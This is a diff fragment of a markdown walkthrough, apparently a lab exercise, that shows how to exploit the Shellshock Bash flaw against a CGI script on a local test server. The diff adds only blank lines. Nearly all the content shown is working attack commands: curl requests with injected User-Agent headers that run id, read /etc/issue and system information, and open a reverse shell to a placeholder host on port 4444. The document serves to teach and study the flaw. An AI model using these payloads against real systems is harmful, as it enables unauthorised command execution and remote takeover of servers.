@@ -17,6 +17,7 @@ The vulnerability stems from how Bash parses function definitions passed via env
 ## Exploitation Walkthrough
 
 ### 1. Verification of Vulnerability via Curl
+
 Send a request containing the Shellshock header payload targeting the CGI endpoint:
 
 ```bash
@@ -25,17 +26,20 @@ curl -H "User-Agent: () { :;}; echo Content-Type: text/plain; echo; /bin/id" \
 ```
 
 The server immediately evaluates the injected command and returns:
+
 ```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ### 2. Dumping System Information & Environment
+
 ```bash
 curl -H "User-Agent: () { :;}; echo Content-Type: text/plain; echo; uname -a; cat /etc/issue" \
   http://localhost:8137/victim.cgi
 ```
 
 ### 3. Spawning Reverse Shell
+
 ```bash
 curl -H "User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/HOST_IP/4444 0>&1'" \
   http://localhost:8137/victim.cgi
